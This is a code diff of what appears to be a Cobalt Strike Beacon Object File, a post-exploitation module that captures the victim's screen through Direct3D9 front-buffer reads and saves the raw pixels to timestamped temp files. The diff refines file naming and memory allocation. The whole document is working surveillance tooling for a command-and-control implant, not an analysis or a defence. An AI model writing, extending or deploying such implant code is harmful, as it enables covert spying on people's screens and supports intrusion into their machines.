@@ -12,36 +12,53 @@ WINBASEAPI int __cdecl MSVCRT$fclose(FILE *_File);
 WINBASEAPI size_t __cdecl MSVCRT$fwrite(const void* _Str, size_t _Size, size_t _Count, FILE* _File);
 WINBASEAPI FILE* WINAPI MSVCRT$fopen(const char* filename, const char* mode);
 WINBASEAPI int WINAPI MSVCRT$sprintf(char* buffer, const char* format, ...);
+WINBASEAPI size_t __cdecl MSVCRT$strftime(char* strDest, size_t maxsize, const char* format, const struct tm* timeptr);
+WINBASEAPI time_t __cdecl MSVCRT$time(time_t* timer);
+WINBASEAPI struct tm* __cdecl MSVCRT$localtime(const time_t* _Time);
 DECLSPEC_IMPORT IDirect3D9* WINAPI D3D9$Direct3DCreate9(UINT SDKVersion);
 
+
 #define RELEASE(x) if (x) { x->lpVtbl->Release(x); x = NULL; }
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <time.h>
 
 void SavePixelsToLogFile(int width, int height, int pitch, LPVOID pBits) {
     char fileName[MAX_PATH];
     char *tempPath = MSVCRT$getenv("TEMP");
 
+    // Get current timestamp
+    time_t rawtime;
+    struct tm *timeinfo;
+    MSVCRT$time(&rawtime);
+    timeinfo = MSVCRT$localtime(&rawtime);
+
+    // Format timestamp
+    char timestamp[20];
+    MSVCRT$strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", timeinfo);
+
+    // Construct file name
     if (tempPath == NULL) {
-        BeaconPrintf(CALLBACK_OUTPUT,"Failed to get temporary path, using current directory\n");
-        MSVCRT$sprintf(fileName, "%doo%d.tmp", width, height);
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get temporary path, using current directory\n");
+        MSVCRT$sprintf(fileName, "%s_%doo%d.tmp", timestamp, width, height);
     } else {
-        MSVCRT$sprintf(fileName, "%s\\%doo%d.tmp", tempPath, width, height);
+        MSVCRT$sprintf(fileName, "%s\\%s_%doo%d.tmp", tempPath, timestamp, width, height);
     }
-
-    BeaconPrintf(CALLBACK_OUTPUT,"Output path: %s\n", fileName);
-
+    BeaconPrintf(CALLBACK_OUTPUT, "Output path: %s\n", fileName);
     FILE* file = MSVCRT$fopen(fileName, "wb");
     if (file == NULL) {
-        BeaconPrintf(CALLBACK_OUTPUT,"Failed to open file for writing: %s\n", fileName);
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to open file for writing: %s\n", fileName);
         return;
     }
 
     size_t bytesWritten = MSVCRT$fwrite(pBits, pitch * height, 1, file);
     if (bytesWritten != 1) {
-        BeaconPrintf(CALLBACK_OUTPUT,"Failed to write pixel data to file: %s\n", fileName);
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to write pixel data to file: %s\n", fileName);
     }
 
     MSVCRT$fclose(file);
-    return;
 }
 
 // BOF entry function
@@ -94,9 +111,9 @@ int go() {
         BeaconPrintf(CALLBACK_OUTPUT, "UnlockRect Failed!\n");
         return 0;
     }
-    shots = (LPBYTE*)MSVCRT$malloc(1 * sizeof(LPBYTE));
-    for (UINT i = 0; i < 1; i++) {
-        shots[i] = (LPBYTE)MSVCRT$malloc(pitch * mode.Height);
+    shots = (LPBYTE*)MSVCRT$malloc(sizeof(LPBYTE));
+    if (shots != NULL) {
+        *shots = (LPBYTE)MSVCRT$malloc(pitch * mode.Height);
     }
 
     hr = pDevice->lpVtbl->GetFrontBufferData(pDevice, 0, surface);
